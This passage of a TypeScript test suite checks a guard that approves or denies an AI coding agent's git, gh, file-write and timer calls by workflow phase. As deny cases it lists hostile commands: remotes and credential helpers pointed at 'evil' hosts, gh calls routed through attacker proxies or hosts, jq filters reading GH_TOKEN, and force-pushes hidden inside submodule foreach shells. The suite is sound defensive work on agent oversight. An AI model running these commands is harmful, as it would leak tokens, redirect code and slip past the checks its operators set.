  }
})

// Where git pushes to and how it signs in

test('outside Intent, the remote, URL rewrite, credential and ssh keys may not be set, nor the remotes changed', () => {
  for (const phase of ['Spec', 'Plan', 'Build', 'Test', 'PR'] as const) {
    for (const command of [
      'git config remote.origin.pushurl https://evil/x.git',
      'git config remote.origin.url https://evil/x.git',
      'git config --global url.https://evil/.pushInsteadOf https://github.com/',
      'git config url.https://evil/.insteadOf https://github.com/',
      'git config credential.helper "!sh -c evil"',
      'git config --global credential.https://github.com.helper x',
      'git config core.sshCommand "ssh -i x"',
      'git -c credential.helper=x status',
      'git -c core.sshCommand=x fetch',
      'git -c remote.origin.pushurl=x status',
      'git remote set-url --push origin https://evil/x.git',
      'git remote set-url origin https://evil/x.git',
      'git remote add evil https://evil/x.git',
      'git remote rename origin old',
      'git remote remove origin',
      'git remote rm origin',
    ]) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase))}`).toBe(
        `${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`
      )
    }
  }
  for (const command of ['git remote -v', 'git remote get-url origin', 'git remote', 'git config --get remote.origin.url', 'git config remote.origin.url']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
})

// Fix round 2

test('git submodule foreach keeps every word of its command but its own options', () => {
  for (const phase of ['Build', 'PR'] as const) {
    const reason = phase === 'PR' ? TARGET_TEXT : PHASE_TEXT(phase)
    for (const command of [
      'git submodule foreach git -C .. push --force origin HEAD:main',
      'git submodule foreach --recursive git push --force origin HEAD:main',
      'git submodule --quiet foreach -q --recursive git push origin main',
    ]) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase))}`).toBe(`${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason })}`)
    }
  }
  expect(run('git submodule foreach --recursive git -c core.hooksPath=/h status', 'Build')).toEqual({ verdict: 'deny', reason: GIT_CONFIG_TEXT })
  expect(run('git submodule foreach --recursive git status --short', 'Build')).toEqual({ verdict: 'pass' })
})

test('git config may not rename or remove a section whose keys the guard protects', () => {
  for (const command of [
    'git config --rename-section foo remote.origin',
    'git config --rename-section foo core',
    'git config --rename-section core foo',
    'git config --rename-section foo url.https://evil/',
    'git config --rename-section foo credential',
    'git config --rename-section foo filter.a',
    'git config --rename-section foo diff.a',
    'git config --global --rename-section foo Remote.Origin',
    'git config rename-section foo remote.origin',
    'git config --remove-section core',
    'git config --remove-section remote.origin',
    'git config remove-section filter.lfs',
    'git config --rename-section foo',
    'git config --rename-section',
    'git config --rename-section foo "$X"',
    'git config --rename foo core',
    'git config --remove core',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  for (const command of ['git config --rename-section foo include', 'git config --rename-section foo includeIf.gitdir:/x']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
  for (const command of ['git config --rename-section foo bar', 'git config --remove-section alias', 'git config rename-section user.x user.y']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'pass' })}`)
  }
})

test('git clone and git submodule read any abbreviation of --config as --config', () => {
  for (const command of [
    'git clone --conf filter.sf.clean=evil src sub',
    'git clone --confi=core.hooksPath=/h src sub',
    'git clone --con core.fsmonitor=x src sub',
    'git submodule add --conf filter.a.clean=x ../s s',
  ]) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  expect(run('git clone --conf core.autocrlf=false src sub', 'Build')).toEqual({ verdict: 'pass' })
})

// Fix round 3

test('git clone reads --co and every longer prefix of --config as --config', () => {
  for (const command of ['git clone --co core.hooksPath=/h src sub', 'git clone --co=core.hooksPath=/h src sub', 'git clone --conf=filter.a.clean=x src sub']) {
    expect(`${command}: ${JSON.stringify(run(command, 'Build'))}`).toBe(`${command}: ${JSON.stringify({ verdict: 'deny', reason: GIT_CONFIG_TEXT })}`)
  }
  expect(run('git clone --co core.autocrlf=false src sub', 'Build')).toEqual({ verdict: 'pass' })
})

test('git submodule foreach with a shell or an interpreter first is denied as a push', () => {
  for (const phase of ['Build', 'PR'] as const) {
    const reason = phase === 'PR' ? TARGET_TEXT : PHASE_TEXT(phase)
    for (const command of [
      "git submodule foreach sh -c 'git push origin HEAD:main'",
      'git submodule foreach bash -c "git push origin HEAD:main"',
      "git submodule foreach --recursive zsh -c 'git status'",
      'git submodule --quiet foreach -q env git push',
      'git submodule foreach python3 x.py',
      'git submodule foreach python x.py',
      'git submodule foreach node x.js',
      'git submodule foreach eval "git push"',
      'git submodule foreach xargs git push',
      'git submodule foreach command git push',
      'git submodule foreach exec git push',
      'git submodule foreach ksh -c x',
      'git submodule foreach fish -c x',
      'git submodule foreach dash -c x',
      'git submodule foreach perl -e x',
      'git submodule foreach ruby -e x',
      "git submodule foreach /bin/sh -c 'git push origin HEAD:main'",
      'git submodule foreach /usr/bin/env git push',
    ]) {
      expect(`${command} @ ${phase}: ${JSON.stringify(run(command, phase))}`).toBe(`${command} @ ${phase}: ${JSON.stringify({ verdict: 'deny', reason })}`)
    }
  }
  expect(run('git submodule foreach git status', 'Build')).toEqual({ verdict: 'pass' })
  expect(run('git submodule foreach git status', 'PR')).toEqual({ verdict: 'pass' })
})

// Timers during a run

const TIMERS_TEXT = 'goal-and-do blocks timers during a run. Subagents and background tasks report back by themselves.'

const TIMER_CALLS: { tool: string; input: Record<string, unknown> }[] = [
  { tool: 'ScheduleWakeup', input: { delaySeconds: 60, reason: 'Waiting for change-reviewer agent to finish', prompt: 'loop' } },
  { tool: 'CronCreate', input: { cron: '*/5 * * * *', prompt: 'check' } },
]

test('cancelling a timer passes during a run: a wakeup with stop: true, and CronDelete', () => {
  expect(guard({ tool: 'ScheduleWakeup', input: { stop: true } }, ctxFor('PR', { blocksTimers: true }))).toEqual({ verdict: 'pass' })
  expect(guard({ tool: 'CronDelete', input: { id: 'job-1' } }, ctxFor('PR', { blocksTimers: true }))).toEqual({ verdict: 'pass' })
  // stop with any other value still sets one.
  expect(guard({ tool: 'ScheduleWakeup', input: { stop: 'true', delaySeconds: 60 } }, ctxFor('PR', { blocksTimers: true }))).toEqual({
    verdict: 'deny',
    reason: TIMERS_TEXT,
  })
})

for (const call of TIMER_CALLS) {
  test(`during a run, ${call.tool} is denied in every phase with the fixed reason`, () => {
    for (const phase of PHASES) {
      expect(guard(call, ctxFor(phase, { blocksTimers: true })), phase).toEqual({ verdict: 'deny', reason: TIMERS_TEXT })
    }
    expect(reasonKeyOf(TIMERS_TEXT)).toBe('timers')
  })

  test(`outside a run, and for a run that sets no timer block, ${call.tool} passes the timer rule`, () => {
    expect(guard(call, ctxFor('PR', { active: false, blocksTimers: true }))).toEqual({ verdict: 'pass' })
    expect(guard(call, ctxFor('PR', { blocksTimers: false }))).toEqual({ verdict: 'pass' })
    expect(guard(call, ctxFor('PR'))).toEqual({ verdict: 'pass' })
  })
}

test('the timer rule leaves other tools alone', () => {
  for (const tool of ['CronList', 'Agent', 'TaskOutput', 'Monitor']) {
    expect(guard({ tool, input: {} }, ctxFor('Build', { blocksTimers: true })), tool).toEqual({ verdict: 'pass' })
  }
})

test("in a worktree, the edit tools may write the mod's folder under the worktree's Git folder, and nothing else there", () => {
  const edit = (file_path: string) => guard({ tool: 'Write', input: { file_path, content: 'x' } }, ctxFor('PR'))
  expect(edit('/main/.git/worktrees/wt/goal-and-do/pr-body-ABC-1.md')).toEqual({ verdict: 'pass' })
  expect(edit('/main/.git/worktrees/wt/goal-and-do/pr-title-ABC-1.txt')).toEqual({ verdict: 'pass' })
  for (const path of [
    '/main/.git/worktrees/wt/config.worktree',
    '/main/.git/worktrees/wt/HEAD',
    '/main/.git/worktrees/wt/goal-and-do',
    '/main/.git/worktrees/wt/goal-and-do/../config.worktree',
    '/main/.git/worktrees/goal-and-do/x',
    '/main/.git/worktrees//goal-and-do/x',
  ]) {
    expect(`${path}: ${JSON.stringify(edit(path))}`).toBe(`${path}: ${JSON.stringify({ verdict: 'deny', reason: GIT_DIR_TEXT })}`)
  }
})

test('the Plan phase allows an Edit of spec.md, the file a decided Departure is written into, and still refuses approvals.md, run.json and the locked tests', () => {
  for (const path of ['changes/ABC-1/spec.md', '/repo/changes/ABC-1/spec.md', 'changes/ABC-1/./spec.md']) {
    for (const tool of ['Edit', 'MultiEdit', 'Write']) expect(edit(tool, path, 'Plan'), `${tool} ${path}`).toEqual({ verdict: 'pass' })
  }
  expect(edit('Edit', 'changes/ABC-1/approvals.md', 'Plan').verdict).toBe('deny')
  expect(edit('Edit', 'changes/ABC-1/run.json', 'Plan').verdict).toBe('deny')
  expect(edit('Edit', 'tests/acceptance/a.test.ts', 'Plan', { lockedPaths: ['tests/acceptance/a.test.ts'] }).verdict).toBe('deny')
})

// PR 50's second review: the gh checks of the PR phase.
const prKey = (command: string): string | undefined => {
  const result = guard({ tool: 'Bash', input: { command } }, ctxFor('PR'))
  return result.verdict === 'deny' ? reasonKeyOf(result.reason) : result.verdict
}

test('PR phase: a $ or a backquote in a gh word is refused, since the guard cannot see what it expands to', () => {
  expect(prKey('U=https://attacker.example/x; gh api "$U"')).toBe('ghForm')
  expect(prKey('F=env; gh api repos/o/r --jq "$F"')).toBe('ghForm')
  expect(prKey('gh api `echo repos/o/r`')).toBe('ghForm')
  expect(prKey('gh pr view 1 --json title --jq "$F"')).toBe('ghForm')
  expect(prKey('gh api repos/o/r/pulls')).toBe('pass')
  expect(prKey("gh pr view 1 --json title --jq '.title'")).toBe('pass')
})

test('PR phase: a jq filter that reads the environment, and a proxy or host variable, are refused for every gh form', () => {
  expect(prKey('gh pr view 1 --json title --jq env')).toBe('ghForm')
  expect(prKey("gh run list --json name --jq '$ENV'")).toBe('ghForm')
  expect(prKey('gh pr checks 1 --json name -q env.GH_TOKEN')).toBe('ghForm')
  expect(prKey('HTTPS_PROXY=http://x:8080 gh pr create --title t --body b')).toBe('ghForm')
  expect(prKey('GH_HOST=evil.example gh pr view 1')).toBe('ghForm')
})

test('PR phase: GH_PAGER=cat and gh flags that only change output pass in front of gh; another pager does not', () => {
  expect(prKey('GH_PAGER=cat gh api repos/o/r/pulls/1/comments')).toBe('pass')
  expect(prKey('GH_PAGER=cat gh pr view 1')).toBe('pass')
  expect(prKey('GH_NO_UPDATE_NOTIFIER=1 NO_COLOR=1 gh pr checks 1')).toBe('pass')
  expect(prKey('GH_PAGER=less gh api repos/o/r')).toBe('ghForm')
  expect(prKey("GH_PAGER='sh -c x' gh pr view 1")).toBe('ghForm')
})

test('an export of a proxy, a CA file or a gh variable is refused with its own reason, not the push reason', () => {
  for (const command of [
    'export HTTPS_PROXY=http://attacker:8080; gh api user',
    'export https_proxy=http://a:1',
    'export SSL_CERT_FILE=./ca.pem',
    'export GH_HOST=github.example.com',
    'export NODE_EXTRA_CA_CERTS=./ca.pem',
  ]) {
    expect(prKey(command), command).toBe('envRedirect')
  }
  expect(guard({ tool: 'Bash', input: { command: 'export GH_HOST=x' } }, ctxFor('Build')).verdict).toBe('deny')
  expect(prKey('export NO_COLOR=1')).toBe('pass')
})
